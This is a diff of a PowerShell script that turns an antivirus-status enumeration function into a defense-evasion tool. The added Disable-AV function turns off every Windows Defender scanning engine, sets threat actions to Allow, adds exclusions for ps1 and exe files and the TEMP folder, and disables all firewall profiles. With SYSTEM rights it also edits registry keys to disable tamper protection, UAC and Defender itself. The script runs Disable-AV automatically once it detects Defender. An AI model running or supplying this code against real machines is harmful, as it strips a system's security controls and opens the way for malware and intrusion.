@@ -1,5 +1,11 @@
-function Get-LHSAntiVirusProduct 
-{
+
+function Test-Administrator  
+{  
+    $user = [Security.Principal.WindowsIdentity]::GetCurrent();
+    (New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)  
+}
+
+function Get-LHSAntiVirusProduct {
 <#
 .SYNOPSIS
     Get the status of Antivirus Product on local and Remote Computers.
@@ -80,7 +86,6 @@ function Get-LHSAntiVirusProduct
  
  
 [CmdletBinding()]
- 
 param (
     [parameter(ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]
     [Alias('CN')]
@@ -88,9 +93,9 @@ param (
 )
  
 BEGIN {
- 
     Set-StrictMode -Version Latest
     ${CmdletName} = $Pscmdlet.MyInvocation.MyCommand.Name
+    Write-Host "[+] Enumerating the current active PSP..."
  
 } # end BEGIN
  
@@ -109,7 +114,7 @@ PROCESS {
                     Write-Verbose "OS Windows Vista/Server 2008 or newer detected."
                     $AntiVirusProduct = Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct -ComputerName $Computer -ErrorAction Stop
                 } 
-                Else 
+                else 
                 {
                     Write-Verbose "Windows 2000, 2003, XP detected" 
                     $AntiVirusProduct = Get-WmiObject -Namespace root\SecurityCenter -Class AntiVirusProduct  -ComputerName $Computer -ErrorAction Stop
@@ -119,6 +124,7 @@ PROCESS {
                 it appears that if you convert the productstate to HEX then you can read the 1st 2nd or 3rd block 
                 to get whether product is enabled/disabled and whether definitons are up-to-date or outdated
                 #>
+                Write-Verbose "[+] Enumerating the PSP State"
                 $productState = $AntiVirusProduct.productState
  
                 # convert to hex, add an additional '0' left if necesarry
@@ -161,36 +167,10 @@ PROCESS {
                     "10" {"OUT_OF_DATE"}
                     default {"UNKNOWN"}
                 }  
- 
-<#  
-                # Switch to determine the status of antivirus definitions and real-time protection.
-                # The values in this switch-statement are retrieved from the following website: http://community.kaseya.com/resources/m/knowexch/1020.aspx
-                switch ($AntiVirusProduct.productState) {
-                     #AVG Internet Security 2012 (from antivirusproduct WMI)
-                     "262144" {$defstatus = "Up to date" ;$rtstatus = "Disabled"}
-                     "266240" {$defstatus = "Up to date" ;$rtstatus = "Enabled"}
- 
-                     "262160" {$defstatus = "Out of date" ;$rtstatus = "Disabled"}
-                     "266256" {$defstatus = "Out of date" ;$rtstatus = "Enabled"}
-                     "393216" {$defstatus = "Up to date" ;$rtstatus = "Disabled"}
-                     "393232" {$defstatus = "Out of date" ;$rtstatus = "Disabled"}
-                     "393488" {$defstatus = "Out of date" ;$rtstatus = "Disabled"}
-                     "397312" {$defstatus = "Up to date" ;$rtstatus = "Enabled"}
-                     "397328" {$defstatus = "Out of date" ;$rtstatus = "Enabled"}
-                     #Windows Defender
-                     "393472" {$defstatus = "Up to date" ;$rtstatus = "Disabled"} 
-                     "397584" {$defstatus = "Out of date" ;$rtstatus = "Enabled"}
-                     "397568" {$defstatus = "Up to date" ;$rtstatus = "Enabled"}
- 
-                     default {$defstatus = "Unknown" ;$rtstatus = "Unknown"}
-                }
-#>
- 
- 
+
                 # Output PSCustom Object
                 $AV = $Null
                 $AV = New-Object -TypeName PSObject -ErrorAction Stop -Property @{
- 
                     ComputerName = $AntiVirusProduct.__Server;
                     Name = $AntiVirusProduct.displayName;
                     ProductExecutable = $AntiVirusProduct.pathToSignedProductExe;
@@ -200,25 +180,143 @@ PROCESS {
                     ProductState = $productState;
  
                 } | Select-Object ComputerName,Name,ProductExecutable,ReportingExecutable,DefinitionStatus,RealTimeProtectionStatus,ProductState  
- 
-                Write-Output $AV 
+                return $AV
             }
             Catch 
             {
                 Write-Error "\\$Computer : WMI Error"
                 Write-Error $_
-            }                              
-        } 
-        Else 
+            }
+        }
+        else 
         {
             Write-Warning "\\$computer DO NOT reply to ping" 
-        } # end IF (Test-Connection -ComputerName $Computer -count 2 -quiet)
+        } 
  
-    } # end ForEach ($Computer in $computerName)
- 
-} # end PROCESS
- 
-END { Write-Verbose "Function Get-LHSAntiVirusProduct finished." } 
-} # end function Get-LHSAntiVirusProduct
- 
-Get-LHSAntiVirusProduct
+    }
+}
+END {
+    Write-Host "[+] Get-LHSAntiVirusProduct completed!" }  
+}
+
+function Disable-AV {
+    param(
+        $agressive=$true,
+        $exclPath=$env:TEMP
+    )
+    
+    if(!(Test-Administrator)){
+        Write-Host "[-] Disable-AV needs to be ran from a High-Integrity Administrator process."
+        return
+    }
+    $isSystem = $($(whoami) -eq "nt authority\system")
+
+    Write-Host "[+] Attempting to Disable UAC, Firewalls, and Windows Defender with Path Exclusions and Defender Preferences."
+
+    $defender=(Get-MpComputerStatus)
+    if ($defender.IsTamperProtected){
+        if ($isSystem){
+            # Tamper protection
+            Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name TamperProtection -Value 4
+        }
+        else{
+            Write-Host "[-] Tamper Protection Detected. Unable to automatically turn off Defender."
+            Write-Host "[*] if you have GUI access, Turn off Tamper Protection in Windows Security > Virus & Threat Protection"
+            Write-Host "[*] Otherwise, you must run this script with SYSTEM privileges"
+            return
+        }
+    }
+    
+    Write-Host "[+] Disabling Scanning Engines (Set-MpPreference)"
+    foreach ($cmd in $(Get-Command Set-MPPreference).Parameters.Values){
+        $action = $cmd.Name
+        if( $action -like "Disable*"){
+            $errorChoice = 'ErrorAction'
+            $params = @{ $action = $true; $errorChoice = 'SilentlyContinue' }
+            Write-Host "    [*] Disabling $($action.Substring(7))"
+            Set-MPPreference @params
+        }
+        elseif ($action -like "Enable*") {
+            $errorChoice = 'ErrorAction'
+            # These guys are special
+            if($action -like "*NetworkProtection" -or $action -like "*ControlledFolderAccess"){
+                $params = @{ $action = 'Disabled'; $errorChoice = 'SilentlyContinue' }
+            }
+            else{
+                $params = @{ $action = $false; $errorChoice = 'SilentlyContinue' }
+            }
+            Write-Host "    [*] Disabling $($action.Substring(6))"
+            Set-MPPreference @params
+        }
+    }
+
+    Write-Host "[+] Setting default discovered threat actions to Allow (Set-MpPreference)"
+    Set-MpPreference -LowThreatDefaultAction Allow -ErrorAction SilentlyContinue
+    Set-MpPreference -ModerateThreatDefaultAction Allow -ErrorAction SilentlyContinue
+    Set-MpPreference -HighThreatDefaultAction Allow -ErrorAction SilentlyContinue
+
+
+    Write-Host "[+] Adding Exclusion to '$($exclPath)', PS1s, EXEs, and disabling Firewalls"
+    Set-MpPreference -ExclusionExtension "ps1" -ErrorAction SilentlyContinue
+    Set-MpPreference -ExclusionExtension "exe" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath $exclPath
+    # disable firewalls (requires admin)
+    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+
+    if($isSystem) {
+        Write-Host "[*] Attempting to disable UAC, RTP, Tamper Protection, and Defender through the Registry"
+
+        Write-Host "[+] Disabling Realtime Protection (HKLM Hive)"
+        # Cloud-delivered protection:
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name SpyNetReporting -Value 0
+        # Automatic Sample submission
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name SubmitSamplesConsent -Value 0
+
+        Write-Host "[+] Allowing admins to perform elevated actions without consent prompt popup"
+        Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name ConsentPromptBehaviorAdmin -Value 0
+        
+        if($aggressive){
+            Write-Host "[*] Agressive mode on. Modifying values that require a reboot to take effect"
+            
+            Write-Host "[+] Disabling UAC (HKLM Hive)"
+            Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Value 0
+
+            # Determine if Defender vulnerable to complete disabling
+            $curVersion=($defender.AMServiceVersion).Split('.')
+            $safeVersion=("4.18.2108.4").Split('.')
+            $safe = $true
+            for( ($i=0); $i -lt $safeVersion.Count; $i++)
+            {
+                if ($curVersion[$i] -lt $safeVersion[$i]) {
+                    $safe = $false
+                    break
+                }
+            }
+            # Defender
+            if( $safe ){
+                Write-Host "[-] Unable to Disable Microsoft Defender Antivirus on Windows Defender v$($defender.AMServiceVersion)."
+                Write-Host "[-] Windows Defender versions after 4.18.2108.4 ignore the registry key."
+            }
+            else{
+                Write-Host "[+] Windows Defender version " + $defender.AMServiceVersion + " vulnerable to disabling."
+                Write-Host "[+] Disabling Defender (HKLM Hive)"
+                Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
+                Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
+            }
+        }
+    }
+    else{
+        Write-Host "[-] Run with SYSTEM integrity to disable UAC, TP, Tamper Protection, and Defender through the Registry!"
+    }
+    Write-Host "[+] Disable-AV Completed!"
+}
+
+$AV = Get-LHSAntiVirusProduct
+$AV
+
+if ($AV.ProductExecutable -Like "*windowsdefender://*"){
+    Disable-AV
+}
+else{
+    Write-Host "Unsupported PSP '$($AV.ProductExecutable)'. Disabling AV only supported with Windows Defender"
+}
